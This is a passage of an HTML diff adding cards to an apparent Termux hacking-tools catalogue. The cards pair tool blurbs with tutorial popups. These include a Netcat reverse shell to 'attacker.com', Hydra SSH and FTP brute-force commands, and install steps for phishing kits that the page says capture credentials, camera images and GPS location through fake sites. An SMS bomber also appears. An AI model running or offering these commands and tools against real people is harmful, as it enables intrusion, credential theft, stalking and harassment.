+          <div class="tc-actions">
+            <span class="tc-diff"><i class="fa fa-circle dot-fill"></i><i class="fa fa-circle dot-fill"></i><i class="fa fa-circle" style="color:var(--t3)"></i></span>
+            <a href="#" class="tc-btn tc-btn-o" onclick="showToast('Opening GitHub...')"><i class="fab fa-github"></i> GitHub</a>
+            <a href="#" class="tc-btn tc-btn-g" onclick="openTutorial('Netcat','<p><strong>Install:</strong></p><pre>pkg install netcat-openbsd</pre><p><strong>Port scan:</strong></p><pre>nc -zv target.com 1-1000</pre><p><strong>Reverse shell:</strong></p><pre>nc -e /bin/sh attacker.com 4444</pre>')"><i class="fa fa-book-open"></i> Tutorial</a>
+          </div>
+        </div>
+      </div>
+      <div class="tc-arr"><i class="fa fa-arrow-right"></i></div>
+    </div>
+    <div class="tool-card tc-network" data-cat="network" data-name="tcpdump">
+      <div class="tc-icon-box" style="background:linear-gradient(160deg,#001018,#001f30)"><span class="tc-rank">#04</span>📊</div>
+      <div class="tc-body">
+        <div class="tc-top">
+          <div class="tc-name-wrap"><div class="tc-name">Tcpdump</div><div class="tc-ver">v4.99 · Packet Analyzer</div></div>
+          <div class="tc-badges"><span class="tcb tcb-b">Network</span><span class="tcb tcb-g">Free</span></div>
+        </div>
+        <div class="tc-desc">A command-line packet analyzer for capturing and inspecting network traffic in real time. Filter by host, port or protocol, save captures to .pcap files for later analysis in Wireshark, and troubleshoot network issues directly from the terminal.</div>
+        <div class="tc-foot">
+          <div class="tc-tags"><span class="tc-tag">#tcpdump</span><span class="tc-tag">#packets</span><span class="tc-tag">#sniffer</span><span class="tc-tag">#network</span></div>
+          <div class="tc-actions">
+            <span class="tc-diff"><i class="fa fa-circle dot-fill"></i><i class="fa fa-circle dot-fill"></i><i class="fa fa-circle" style="color:var(--t3)"></i></span>
+            <a href="#" class="tc-btn tc-btn-o" onclick="showToast('Opening GitHub...')"><i class="fab fa-github"></i> GitHub</a>
+            <a href="#" class="tc-btn tc-btn-g" onclick="openTutorial('Tcpdump','<p><strong>Install:</strong></p><pre>pkg install tcpdump</pre><p><strong>Capture on an interface:</strong></p><pre>tcpdump -i wlan0</pre><p><strong>Filter by host and save:</strong></p><pre>tcpdump -i wlan0 host target.com -w capture.pcap</pre>')"><i class="fa fa-book-open"></i> Tutorial</a>
+          </div>
+        </div>
+      </div>
+      <div class="tc-arr"><i class="fa fa-arrow-right"></i></div>
+    </div>
+  </div>
+
+  <!-- PHISHING TOOLS -->
+  <div class="cat-section-hd" data-section="phishing" style="background:rgba(176,96,255,.07);border:1px solid rgba(176,96,255,.2)">
+    <div class="csh-icon">🎣</div>
+    <div class="csh-info">
+      <div class="csh-title">Phishing &amp; Social Engineering Tools</div>
+      <div class="csh-desc">For educational security research and authorized penetration testing only</div>
+    </div>
+    <div class="csh-count" style="color:var(--p)">5 Tools</div>
+  </div>
+  <div class="tools-list">
+
+    <div class="tool-card tc-phishing" data-cat="phishing" data-name="zphisher">
+      <div class="tc-icon-box" style="background:linear-gradient(160deg,#0d0015,#1a0025)"><span class="tc-rank">#01</span>🐟</div>
+      <div class="tc-body">
+        <div class="tc-top">
+          <div class="tc-name-wrap"><div class="tc-name">Zphisher</div><div class="tc-ver">v2.3.5 · 30+ Templates</div></div>
+          <div class="tc-badges"><span class="tcb tcb-p">Phishing</span><span class="tcb tcb-r">Edu Only</span></div>
+        </div>
+        <div class="tc-desc">A beginner-friendly automated phishing tool. Supports 30+ website templates including Instagram, Facebook, Gmail, Twitter, Netflix and more. Uses Cloudflared and Ngrok for tunnel support.</div>
+        <div class="tc-foot">
+          <div class="tc-tags"><span class="tc-tag">#zphisher</span><span class="tc-tag">#phishing</span><span class="tc-tag">#social</span><span class="tc-tag">#tunneling</span></div>
+          <div class="tc-actions">
+            <span class="tc-diff"><i class="fa fa-circle dot-fill"></i><i class="fa fa-circle" style="color:var(--t3)"></i><i class="fa fa-circle" style="color:var(--t3)"></i></span>
+            <a href="#" class="tc-btn tc-btn-o" onclick="showToast('Opening GitHub...')"><i class="fab fa-github"></i> GitHub</a>
+            <a href="#" class="tc-btn tc-btn-g" onclick="openTutorial('Zphisher','<p><strong>Install:</strong></p><pre>pkg install git curl php openssh\ngit clone https://github.com/htr-tech/zphisher\ncd zphisher\nbash zphisher.sh</pre>')"><i class="fa fa-book-open"></i> Tutorial</a>
+          </div>
+        </div>
+      </div>
+      <div class="tc-arr"><i class="fa fa-arrow-right"></i></div>
+    </div>
+
+    <div class="tool-card tc-phishing" data-cat="phishing" data-name="anonphisher">
+      <div class="tc-icon-box" style="background:linear-gradient(160deg,#080010,#100020)"><span class="tc-rank">#02</span>🎭</div>
+      <div class="tc-body">
+        <div class="tc-top">
+          <div class="tc-name-wrap"><div class="tc-name">AnonPhisher</div><div class="tc-ver">Latest · Termux</div></div>
+          <div class="tc-badges"><span class="tcb tcb-p">Phishing</span><span class="tcb tcb-r">Edu Only</span></div>
+        </div>
+        <div class="tc-desc">Anonymous phishing tool for Termux with multiple platform templates and automatic tunnel setup. Designed to demonstrate social engineering attack vectors for security awareness training.</div>
+        <div class="tc-foot">
+          <div class="tc-tags"><span class="tc-tag">#anon</span><span class="tc-tag">#phishing</span><span class="tc-tag">#anonymous</span></div>
+          <div class="tc-actions">
+            <a href="#" class="tc-btn tc-btn-o" onclick="showToast('Opening GitHub...')"><i class="fab fa-github"></i> GitHub</a>
+            <a href="#" class="tc-btn tc-btn-g" onclick="openTutorial('AnonPhisher','<p><strong>Install:</strong></p><pre>pkg install git python\ngit clone https://github.com/AnonPhisher\ncd AnonPhisher\npython anonphisher.py</pre>')"><i class="fa fa-book-open"></i> Tutorial</a>
+          </div>
+        </div>
+      </div>
+      <div class="tc-arr"><i class="fa fa-arrow-right"></i></div>
+    </div>
+
+    <div class="tool-card tc-phishing" data-cat="phishing" data-name="maxphisher">
+      <div class="tc-icon-box" style="background:linear-gradient(160deg,#0a000d,#150018)"><span class="tc-rank">#03</span>🎯</div>
+      <div class="tc-body">
+        <div class="tc-top">
+          <div class="tc-name-wrap"><div class="tc-name">MaxPhisher</div><div class="tc-ver">Latest · Termux</div></div>
+          <div class="tc-badges"><span class="tcb tcb-p">Phishing</span><span class="tcb tcb-r">Edu Only</span></div>
+        </div>
+        <div class="tc-desc">Advanced phishing toolkit with custom URL masking and location tracking features. Supports multiple templates and tunneling services for creating convincing phishing pages for awareness demos.</div>
+        <div class="tc-foot">
+          <div class="tc-tags"><span class="tc-tag">#maxphisher</span><span class="tc-tag">#phishing</span><span class="tc-tag">#masking</span></div>
+          <div class="tc-actions">
+            <a href="#" class="tc-btn tc-btn-o" onclick="showToast('Opening GitHub...')"><i class="fab fa-github"></i> GitHub</a>
+            <a href="#" class="tc-btn tc-btn-g" onclick="openTutorial('MaxPhisher','<p><strong>Install:</strong></p><pre>pkg install git python3\ngit clone https://github.com/KasRoudra/MaxPhisher\ncd MaxPhisher\npython3 maxphisher.py</pre>')"><i class="fa fa-book-open"></i> Tutorial</a>
+          </div>
+        </div>
+      </div>
+      <div class="tc-arr"><i class="fa fa-arrow-right"></i></div>
+    </div>
+
+    <div class="tool-card tc-phishing" data-cat="phishing" data-name="hidden eye">
+      <div class="tc-icon-box" style="background:linear-gradient(160deg,#030010,#08001a)"><span class="tc-rank">#04</span>👁️</div>
+      <div class="tc-body">
+        <div class="tc-top">
+          <div class="tc-name-wrap"><div class="tc-name">Hidden Eye</div><div class="tc-ver">Latest · Multi-Platform</div></div>
+          <div class="tc-badges"><span class="tcb tcb-p">Phishing</span><span class="tcb tcb-r">Edu Only</span></div>
+        </div>
+        <div class="tc-desc">A modern phishing tool with real-time victim activity notifications. Grabs credentials, location, IP address and device information. Supports 20+ website templates and multiple tunneling methods.</div>
+        <div class="tc-foot">
+          <div class="tc-tags"><span class="tc-tag">#hiddeneye</span><span class="tc-tag">#phishing</span><span class="tc-tag">#location</span></div>
+          <div class="tc-actions">
+            <a href="#" class="tc-btn tc-btn-o" onclick="showToast('Opening GitHub...')"><i class="fab fa-github"></i> GitHub</a>
+            <a href="#" class="tc-btn tc-btn-g" onclick="openTutorial('Hidden Eye','<p><strong>Install:</strong></p><pre>pkg install git python php\ngit clone https://github.com/DarkSecDevelopers/HiddenEye\ncd HiddenEye\npython HiddenEye.py</pre>')"><i class="fa fa-book-open"></i> Tutorial</a>
+          </div>
+        </div>
+      </div>
+      <div class="tc-arr"><i class="fa fa-arrow-right"></i></div>
+    </div>
+
+    <div class="tool-card tc-phishing" data-cat="phishing" data-name="maskphisher maskphish">
+      <div class="tc-icon-box" style="background:linear-gradient(160deg,#07000f,#0f0020)"><span class="tc-rank">#05</span>🎭</div>
+      <div class="tc-body">
+        <div class="tc-top">
+          <div class="tc-name-wrap"><div class="tc-name">MaskPhish</div><div class="tc-ver">Latest · URL Masker</div></div>
+          <div class="tc-badges"><span class="tcb tcb-p">URL Masking</span><span class="tcb tcb-r">Edu Only</span></div>
+        </div>
+        <div class="tc-desc">A simple URL masking tool that hides phishing links behind legitimate-looking URLs. Used to demonstrate how URL-based social engineering attacks deceive users during security awareness training.</div>
+        <div class="tc-foot">
+          <div class="tc-tags"><span class="tc-tag">#maskphish</span><span class="tc-tag">#url</span><span class="tc-tag">#masking</span></div>
+          <div class="tc-actions">
+            <a href="#" class="tc-btn tc-btn-o" onclick="showToast('Opening GitHub...')"><i class="fab fa-github"></i> GitHub</a>
+            <a href="#" class="tc-btn tc-btn-g" onclick="openTutorial('MaskPhish','<p><strong>Install:</strong></p><pre>pkg install git curl\ngit clone https://github.com/jaykali/maskphish\ncd maskphish\nbash maskphish.sh</pre>')"><i class="fa fa-book-open"></i> Tutorial</a>
+          </div>
+        </div>
+      </div>
+      <div class="tc-arr"><i class="fa fa-arrow-right"></i></div>
+    </div>
+
+  </div>
+
+  <!-- OSINT TOOLS -->
+  <div class="cat-section-hd" data-section="osint" style="background:rgba(0,255,136,.05);border:1px solid rgba(0,255,136,.15)">
+    <div class="csh-icon">🔍</div>
+    <div class="csh-info">
+      <div class="csh-title">OSINT &amp; Information Gathering</div>
+      <div class="csh-desc">Open-source intelligence tools for research, reconnaissance and tracking</div>
+    </div>
+    <div class="csh-count" style="color:var(--g)">5 Tools</div>
+  </div>
+  <div class="tools-list">
+
+    <div class="tool-card tc-osint" data-cat="osint" data-name="phoneinfoga">
+      <div class="tc-icon-box" style="background:linear-gradient(160deg,#051a05,#081f08)"><span class="tc-rank">#01</span>📞</div>
+      <div class="tc-body">
+        <div class="tc-top">
+          <div class="tc-name-wrap"><div class="tc-name">PhoneInfoga</div><div class="tc-ver">v2.x · Phone OSINT</div></div>
+          <div class="tc-badges"><span class="tcb tcb-g">OSINT</span><span class="tcb tcb-g">Free</span></div>
+        </div>
+        <div class="tc-desc">Python-based phone number OSINT tool. Searches Google, social media and telecom databases to gather information about a person using their phone number. Supports international format numbers.</div>
+        <div class="tc-foot">
+          <div class="tc-tags"><span class="tc-tag">#phoneinfoga</span><span class="tc-tag">#osint</span><span class="tc-tag">#phone</span><span class="tc-tag">#python</span></div>
+          <div class="tc-actions">
+            <a href="#" class="tc-btn tc-btn-o" onclick="showToast('Opening GitHub...')"><i class="fab fa-github"></i> GitHub</a>
+            <a href="#" class="tc-btn tc-btn-g" onclick="openTutorial('PhoneInfoga','<p><strong>Install:</strong></p><pre>pkg install python git\npip install phoneinfoga</pre><p><strong>Run:</strong></p><pre>phoneinfoga -n +1234567890</pre>')"><i class="fa fa-book-open"></i> Tutorial</a>
+          </div>
+        </div>
+      </div>
+      <div class="tc-arr"><i class="fa fa-arrow-right"></i></div>
+    </div>
+
+    <div class="tool-card tc-osint" data-cat="osint" data-name="sherlock">
+      <div class="tc-icon-box" style="background:linear-gradient(160deg,#001510,#002020)"><span class="tc-rank">#02</span>🔎</div>
+      <div class="tc-body">
+        <div class="tc-top">
+          <div class="tc-name-wrap"><div class="tc-name">Sherlock</div><div class="tc-ver">v0.15 · Username Hunter</div></div>
+          <div class="tc-badges"><span class="tcb tcb-g">OSINT</span><span class="tcb tcb-g">Free</span></div>
+        </div>
+        <div class="tc-desc">Hunt down social media accounts by username across 300+ platforms simultaneously. Fast, reliable and supports output to text files. One of the most popular OSINT tools for user enumeration.</div>
+        <div class="tc-foot">
+          <div class="tc-tags"><span class="tc-tag">#sherlock</span><span class="tc-tag">#username</span><span class="tc-tag">#osint</span><span class="tc-tag">#social</span></div>
+          <div class="tc-actions">
+            <a href="#" class="tc-btn tc-btn-o" onclick="showToast('Opening GitHub...')"><i class="fab fa-github"></i> GitHub</a>
+            <a href="#" class="tc-btn tc-btn-g" onclick="openTutorial('Sherlock','<p><strong>Install:</strong></p><pre>pkg install git python\ngit clone https://github.com/sherlock-project/sherlock\ncd sherlock\npip install -r requirements.txt</pre><p><strong>Run:</strong></p><pre>python sherlock.py username</pre>')"><i class="fa fa-book-open"></i> Tutorial</a>
+          </div>
+        </div>
+      </div>
+      <div class="tc-arr"><i class="fa fa-arrow-right"></i></div>
+    </div>
+
+    <div class="tool-card tc-osint" data-cat="osint" data-name="seeker">
+      <div class="tc-icon-box" style="background:linear-gradient(160deg,#001518,#001f28)"><span class="tc-rank">#03</span>📍</div>
+      <div class="tc-body">
+        <div class="tc-top">
+          <div class="tc-name-wrap"><div class="tc-name">Seeker Tool</div><div class="tc-ver">Latest · Location OSINT</div></div>
+          <div class="tc-badges"><span class="tcb tcb-g">OSINT</span><span class="tcb tcb-r">Edu Only</span></div>
+        </div>
+        <div class="tc-desc">Grabs accurate location data using HTML5 geolocation API via a convincing fake website. Captures GPS coordinates, accuracy, altitude and device information. Used for location OSINT research demonstrations.</div>
+        <div class="tc-foot">
+          <div class="tc-tags"><span class="tc-tag">#seeker</span><span class="tc-tag">#location</span><span class="tc-tag">#gps</span><span class="tc-tag">#osint</span></div>
+          <div class="tc-actions">
+            <a href="#" class="tc-btn tc-btn-o" onclick="showToast('Opening GitHub...')"><i class="fab fa-github"></i> GitHub</a>
+            <a href="#" class="tc-btn tc-btn-g" onclick="openTutorial('Seeker','<p><strong>Install:</strong></p><pre>pkg install git python php\ngit clone https://github.com/thewhiteh4t/seeker\ncd seeker\npython seeker.py</pre>')"><i class="fa fa-book-open"></i> Tutorial</a>
+          </div>
+        </div>
+      </div>
+      <div class="tc-arr"><i class="fa fa-arrow-right"></i></div>
+    </div>
+
+    <div class="tool-card tc-osint" data-cat="osint" data-name="camphish">
+      <div class="tc-icon-box" style="background:linear-gradient(160deg,#00100d,#001a14)"><span class="tc-rank">#04</span>📷</div>
+      <div class="tc-body">
+        <div class="tc-top">
+          <div class="tc-name-wrap"><div class="tc-name">CamPhish</div><div class="tc-ver">Latest · Camera OSINT</div></div>
+          <div class="tc-badges"><span class="tcb tcb-g">OSINT</span><span class="tcb tcb-r">Edu Only</span></div>
+        </div>
+        <div class="tc-desc">A phishing-based tool that tricks a target into allowing camera permissions via a fake website. Captures images from the device's front or rear camera along with GPS location. For security awareness research.</div>
+        <div class="tc-foot">
+          <div class="tc-tags"><span class="tc-tag">#camphish</span><span class="tc-tag">#camera</span><span class="tc-tag">#location</span><span class="tc-tag">#osint</span></div>
+          <div class="tc-actions">
+            <a href="#" class="tc-btn tc-btn-o" onclick="showToast('Opening GitHub...')"><i class="fab fa-github"></i> GitHub</a>
+            <a href="#" class="tc-btn tc-btn-g" onclick="openTutorial('CamPhish','<p><strong>Install:</strong></p><pre>pkg install git php openssh\ngit clone https://github.com/techchipnet/CamPhish\ncd CamPhish\nbash camphish.sh</pre>')"><i class="fa fa-book-open"></i> Tutorial</a>
+          </div>
+        </div>
+      </div>
+      <div class="tc-arr"><i class="fa fa-arrow-right"></i></div>
+    </div>
+
+    <div class="tool-card tc-osint" data-cat="osint" data-name="little brother">
+      <div class="tc-icon-box" style="background:linear-gradient(160deg,#050d10,#0a1a18)"><span class="tc-rank">#05</span>👀</div>
+      <div class="tc-body">
+        <div class="tc-top">
+          <div class="tc-name-wrap"><div class="tc-name">Little Brother</div><div class="tc-ver">Latest · Monitoring</div></div>
+          <div class="tc-badges"><span class="tcb tcb-g">OSINT</span><span class="tcb tcb-r">Edu Only</span></div>
+        </div>
+        <div class="tc-desc">An OSINT monitoring tool designed to track and gather information about targets from public sources. Collects social media data, public profiles and associated accounts for security research purposes.</div>
+        <div class="tc-foot">
+          <div class="tc-tags"><span class="tc-tag">#littlebrother</span><span class="tc-tag">#monitoring</span><span class="tc-tag">#osint</span></div>
+          <div class="tc-actions">
+            <a href="#" class="tc-btn tc-btn-o" onclick="showToast('Opening GitHub...')"><i class="fab fa-github"></i> GitHub</a>
+            <a href="#" class="tc-btn tc-btn-g" onclick="openTutorial('Little Brother','<p><strong>Install:</strong></p><pre>pkg install git python\ngit clone https://github.com/LittleBrother\ncd LittleBrother\npython littlebrother.py</pre>')"><i class="fa fa-book-open"></i> Tutorial</a>
+          </div>
+        </div>
+      </div>
+      <div class="tc-arr"><i class="fa fa-arrow-right"></i></div>
+    </div>
+
+  </div>
+
+  <!-- RECON TOOLS -->
+  <div class="cat-section-hd" data-section="recon" style="background:rgba(245,197,24,.06);border:1px solid rgba(245,197,24,.2)">
+    <div class="csh-icon">🕵️</div>
+    <div class="csh-info">
+      <div class="csh-title">Recon &amp; User Tracking</div>
+      <div class="csh-desc">Username enumeration, social media tracking and reconnaissance tools</div>
+    </div>
+    <div class="csh-count" style="color:var(--y)">3 Tools</div>
+  </div>
+  <div class="tools-list">
+
+    <div class="tool-card tc-recon" data-cat="recon" data-name="user finder userfinder">
+      <div class="tc-icon-box" style="background:linear-gradient(160deg,#0d0a00,#1a1400)"><span class="tc-rank">#01</span>👤</div>
+      <div class="tc-body">
+        <div class="tc-top">
+          <div class="tc-name-wrap"><div class="tc-name">User Finder</div><div class="tc-ver">Latest · Username Recon</div></div>
+          <div class="tc-badges"><span class="tcb tcb-y">Recon</span><span class="tcb tcb-g">Free</span></div>
+        </div>
+        <div class="tc-desc">Find a person's username across multiple social media platforms simultaneously. Faster alternative to Sherlock for quick username enumeration across popular platforms like Twitter, Reddit and Instagram.</div>
+        <div class="tc-foot">
+          <div class="tc-tags"><span class="tc-tag">#userfinder</span><span class="tc-tag">#username</span><span class="tc-tag">#recon</span><span class="tc-tag">#social</span></div>
+          <div class="tc-actions">
+            <a href="#" class="tc-btn tc-btn-o" onclick="showToast('Opening GitHub...')"><i class="fab fa-github"></i> GitHub</a>
+            <a href="#" class="tc-btn tc-btn-g" onclick="openTutorial('User Finder','<p><strong>Install:</strong></p><pre>pkg install git python\ngit clone https://github.com/UserFinder\ncd UserFinder\npython userfinder.py</pre>')"><i class="fa fa-book-open"></i> Tutorial</a>
+          </div>
+        </div>
+      </div>
+      <div class="tc-arr"><i class="fa fa-arrow-right"></i></div>
+    </div>
+
+    <div class="tool-card tc-recon" data-cat="recon" data-name="faociety fsociety">
+      <div class="tc-icon-box" style="background:linear-gradient(160deg,#0a0a00,#141400)"><span class="tc-rank">#02</span>🎭</div>
+      <div class="tc-body">
+        <div class="tc-top">
+          <div class="tc-name-wrap"><div class="tc-name">FSociety</div><div class="tc-ver">Latest · Multi-Tool</div></div>
+          <div class="tc-badges"><span class="tcb tcb-y">Multi</span><span class="tcb tcb-g">Free</span></div>
+        </div>
+        <div class="tc-desc">An all-in-one hacking tool collection named after the famous Mr. Robot hacker group. Contains modules for recon, scanning, exploitation and social engineering — menu driven and beginner friendly.</div>
+        <div class="tc-foot">
+          <div class="tc-tags"><span class="tc-tag">#fsociety</span><span class="tc-tag">#multi</span><span class="tc-tag">#recon</span><span class="tc-tag">#mrrobot</span></div>
+          <div class="tc-actions">
+            <a href="#" class="tc-btn tc-btn-o" onclick="showToast('Opening GitHub...')"><i class="fab fa-github"></i> GitHub</a>
+            <a href="#" class="tc-btn tc-btn-g" onclick="openTutorial('FSociety','<p><strong>Install:</strong></p><pre>pkg install git python2\ngit clone https://github.com/Manisso/fsociety\ncd fsociety\npython2 fsociety.py</pre>')"><i class="fa fa-book-open"></i> Tutorial</a>
+          </div>
+        </div>
+      </div>
+      <div class="tc-arr"><i class="fa fa-arrow-right"></i></div>
+    </div>
+
+    <div class="tool-card tc-recon" data-cat="recon" data-name="tbomb">
+      <div class="tc-icon-box" style="background:linear-gradient(160deg,#0f0600,#1a0c00)"><span class="tc-rank">#03</span>💣</div>
+      <div class="tc-body">
+        <div class="tc-top">
+          <div class="tc-name-wrap"><div class="tc-name">TBomb</div><div class="tc-ver">Latest · Stress Testing</div></div>
+          <div class="tc-badges"><span class="tcb tcb-y">Testing</span><span class="tcb tcb-r">Edu Only</span></div>
+        </div>
+        <div class="tc-desc">An SMS and call bomber tool for Termux used in authorized stress testing of messaging systems. Sends multiple messages to a number to test system limitations. For authorized testing on your own number only.</div>
+        <div class="tc-foot">
+          <div class="tc-tags"><span class="tc-tag">#tbomb</span><span class="tc-tag">#sms</span><span class="tc-tag">#stresstest</span></div>
+          <div class="tc-actions">
+            <a href="#" class="tc-btn tc-btn-o" onclick="showToast('Opening GitHub...')"><i class="fab fa-github"></i> GitHub</a>
+            <a href="#" class="tc-btn tc-btn-g" onclick="openTutorial('TBomb','<p><strong>Install:</strong></p><pre>pkg install git python\ngit clone https://github.com/TheSpeedX/TBomb\ncd TBomb\npython bomber.py</pre>')"><i class="fa fa-book-open"></i> Tutorial</a>
+          </div>
+        </div>
+      </div>
+      <div class="tc-arr"><i class="fa fa-arrow-right"></i></div>
+    </div>
+
+  </div>
+
+  <!-- PASSWORD TOOLS -->
+  <div class="cat-section-hd" data-section="password" style="background:rgba(255,127,80,.07);border:1px solid rgba(255,127,80,.2)">
+    <div class="csh-icon">🔑</div>
+    <div class="csh-info">
+      <div class="csh-title">Password &amp; Credential Tools</div>
+      <div class="csh-desc">Password cracking, brute force and wordlist generation tools</div>
+    </div>
+    <div class="csh-count" style="color:var(--o)">2 Tools</div>
+  </div>
+  <div class="tools-list">
+
+    <div class="tool-card tc-password" data-cat="password" data-name="hydra">
+      <div class="tc-icon-box" style="background:linear-gradient(160deg,#0d0005,#180010)"><span class="tc-rank">#01</span>🐍</div>
+      <div class="tc-body">
+        <div class="tc-top">
+          <div class="tc-name-wrap"><div class="tc-name">Hydra</div><div class="tc-ver">v9.6 · Fast Login Cracker</div></div>
+          <div class="tc-badges"><span class="tcb tcb-y" style="background:rgba(255,127,80,.12);color:var(--o);border-color:rgba(255,127,80,.3)">Password</span><span class="tcb tcb-g">Free</span></div>
+        </div>
+        <div class="tc-desc">The fastest network login cracker supporting 50+ protocols — SSH, FTP, HTTP, SMTP, RDP, MySQL and more. Supports parallel connections and dictionary/brute-force attacks. Install with <code style="color:var(--g)">pkg install hydra</code>.</div>
+        <div class="tc-foot">
+          <div class="tc-tags"><span class="tc-tag">#hydra</span><span class="tc-tag">#bruteforce</span><span class="tc-tag">#password</span><span class="tc-tag">#login</span></div>
+          <div class="tc-actions">
+            <span class="tc-diff"><i class="fa fa-circle dot-fill"></i><i class="fa fa-circle dot-fill"></i><i class="fa fa-circle dot-fill"></i></span>
+            <a href="#" class="tc-btn tc-btn-o" onclick="showToast('Opening GitHub...')"><i class="fab fa-github"></i> GitHub</a>
+            <a href="#" class="tc-btn tc-btn-g" onclick="openTutorial('Hydra','<p><strong>Install:</strong></p><pre>pkg install hydra</pre><p><strong>SSH brute force:</strong></p><pre>hydra -l admin -P passwords.txt ssh://target.com</pre><p><strong>FTP attack:</strong></p><pre>hydra -L users.txt -P pass.txt ftp://target.com</pre>')"><i class="fa fa-book-open"></i> Tutorial</a>
+          </div>
+        </div>
+      </div>
+      <div class="tc-arr"><i class="fa fa-arrow-right"></i></div>
+    </div>
+
+    <div class="tool-card tc-password" data-cat="password" data-name="cupp">
+      <div class="tc-icon-box" style="background:linear-gradient(160deg,#100800,#1a1000)"><span class="tc-rank">#02</span>🗝️</div>
+      <div class="tc-body">
+        <div class="tc-top">
+          <div class="tc-name-wrap"><div class="tc-name">CUPP Tool</div><div class="tc-ver">v3.2 · Wordlist Generator</div></div>
+          <div class="tc-badges"><span class="tcb tcb-y" style="background:rgba(255,127,80,.12);color:var(--o);border-color:rgba(255,127,80,.3)">Wordlist</span><span class="tcb tcb-g">Free</span></div>
+        </div>
+        <div class="tc-desc">Common User Passwords Profiler — generates targeted custom wordlists based on personal information about a target. Ask target-specific questions (name, DOB, pet name) to build a highly effective password list.</div>
+        <div class="tc-foot">
+          <div class="tc-tags"><span class="tc-tag">#cupp</span><span class="tc-tag">#wordlist</span><span class="tc-tag">#profiler</span><span class="tc-tag">#password</span></div>
+          <div class="tc-actions">
+            <a href="#" class="tc-btn tc-btn-o" onclick="showToast('Opening GitHub...')"><i class="fab fa-github"></i> GitHub</a>
+            <a href="#" class="tc-btn tc-btn-g" onclick="openTutorial('CUPP','<p><strong>Install:</strong></p><pre>pkg install git python\ngit clone https://github.com/Mebus/cupp\ncd cupp\npython cupp.py -i</pre>')"><i class="fa fa-book-open"></i> Tutorial</a>
+          </div>
+        </div>
+      </div>
+      <div class="tc-arr"><i class="fa fa-arrow-right"></i></div>
+    </div>
+
+  </div>
+
+  <!-- SYSTEM TOOLS -->
+  <div class="cat-section-hd" data-section="system" style="background:rgba(56,189,248,.07);border:1px solid rgba(56,189,248,.2)">
+    <div class="csh-icon">⚙️</div>
+    <div class="csh-info">
+      <div class="csh-title">System &amp; Setup Tools</div>
+      <div class="csh-desc">Environment setup, desktop environments and system management tools</div>
+    </div>
+    <div class="csh-count" style="color:#38bdf8">2 Tools</div>
+  </div>
+  <div class="tools-list">
+
+    <div class="tool-card tc-system" data-cat="system" data-name="onexterm onextermux box">
+      <div class="tc-icon-box" style="background:linear-gradient(160deg,#001520,#002030)"><span class="tc-rank">#01</span>📦</div>
+      <div class="tc-body">
+        <div class="tc-top">
+          <div class="tc-name-wrap"><div class="tc-name">OneXTermux Box</div><div class="tc-ver">Latest · Desktop Env</div></div>
+          <div class="tc-badges"><span class="tcb tcb-b">Desktop</span><span class="tcb tcb-g">Free</span></div>
+        </div>
+        <div class="tc-desc">Installs a full desktop environment inside Termux. Provides XFCE or LXDE GUI accessible via VNC viewer on your Android device. Run full Linux applications with a graphical interface without rooting.</div>
+        <div class="tc-foot">
+          <div class="tc-tags"><span class="tc-tag">#onex</span><span class="tc-tag">#desktop</span><span class="tc-tag">#xfce</span><span class="tc-tag">#gui</span></div>
+          <div class="tc-actions">
+            <a href="#" class="tc-btn tc-btn-o" onclick="showToast('Opening GitHub...')"><i class="fab fa-github"></i> GitHub</a>
+            <a href="#" class="tc-btn tc-btn-g" onclick="openTutorial('OneXTermux Box','<p><strong>Install:</strong></p><pre>pkg install git wget\ngit clone https://github.com/OneXTermux\ncd OneXTermux\nbash setup.sh</pre>')"><i class="fa fa-book-open"></i> Tutorial</a>
+          </div>
+        </div>
+      </div>
+      <div class="tc-arr"><i class="fa fa-arrow-right"></i></div>
+    </div>
+
+    <div class="tool-card tc-system" data-cat="system" data-name="mobox emulator">
+      <div class="tc-icon-box" style="background:linear-gradient(160deg,#001018,#00182a)"><span class="tc-rank">#02</span>🎮</div>
+      <div class="tc-body">
+        <div class="tc-top">
+          <div class="tc-name-wrap"><div class="tc-name">Mobox Emulator</div><div class="tc-ver">Latest · Wine + Box86</div></div>
+          <div class="tc-badges"><span class="tcb tcb-b">Emulator</span><span class="tcb tcb-g">Free</span></div>
+        </div>
+        <div class="tc-desc">Runs Windows applications and x86 Linux binaries on Android via Termux using Box86/Box64 and Wine. Enables running Windows security tools and x86 Linux programs directly on your Android phone.</div>
+        <div class="tc-foot">
+          <div class="tc-tags"><span class="tc-tag">#mobox</span><span class="tc-tag">#wine</span><span class="tc-tag">#box86</span><span class="tc-tag">#windows</span></div>
+          <div class="tc-actions">
+            <a href="#" class="tc-btn tc-btn-o" onclick="showToast('Opening GitHub...')"><i class="fab fa-github"></i> GitHub</a>
+            <a href="#" class="tc-btn tc-btn-g" onclick="openTutorial('Mobox Emulator','<p><strong>Install:</strong></p><pre>pkg install wget\nwget https://raw.githubusercontent.com/olegos2/mobox/main/install.sh\nbash install.sh</pre>')"><i class="fa fa-book-open"></i> Tutorial</a>
+          </div>
+        </div>
+      </div>
+      <div class="tc-arr"><i class="fa fa-arrow-right"></i></div>
+    </div>
+
+  </div>
+
+  <!-- STYLE & UI -->
+  <div class="cat-section-hd" data-section="style" style="background:rgba(232,121,249,.06);border:1px solid rgba(232,121,249,.2)">
+    <div class="csh-icon">🎨</div>
+    <div class="csh-info">
+      <div class="csh-title">Style &amp; Customisation</div>
+      <div class="csh-desc">Make your terminal look awesome with themes, fonts and custom banners</div>
+    </div>
+    <div class="csh-count" style="color:#e879f9">2 Tools</div>
+  </div>
+  <div class="tools-list">
+
+    <div class="tool-card tc-style" data-cat="style" data-name="termux style termux-style">
+      <div class="tc-icon-box" style="background:linear-gradient(160deg,#100010,#1a001a)"><span class="tc-rank">#01</span>✨</div>
+      <div class="tc-body">
+        <div class="tc-top">
+          <div class="tc-name-wrap"><div class="tc-name">Termux Style</div><div class="tc-ver">Latest · Theme Manager</div></div>
+          <div class="tc-badges"><span class="tcb" style="background:rgba(232,121,249,.12);color:#e879f9;border:1px solid rgba(232,121,249,.3)">Style</span><span class="tcb tcb-g">Free</span></div>
+        </div>
+        <div class="tc-desc">Apply beautiful themes, color schemes and fonts to your Termux terminal. One-command setup with dozens of pre-built themes including Dracula, Monokai, Nord, Gruvbox and more. Transform your terminal look instantly.</div>
+        <div class="tc-foot">
+          <div class="tc-tags"><span class="tc-tag">#style</span><span class="tc-tag">#theme</span><span class="tc-tag">#colors</span><span class="tc-tag">#fonts</span></div>
+          <div class="tc-actions">
+            <a href="#" class="tc-btn tc-btn-o" onclick="showToast('Opening GitHub...')"><i class="fab fa-github"></i> GitHub</a>
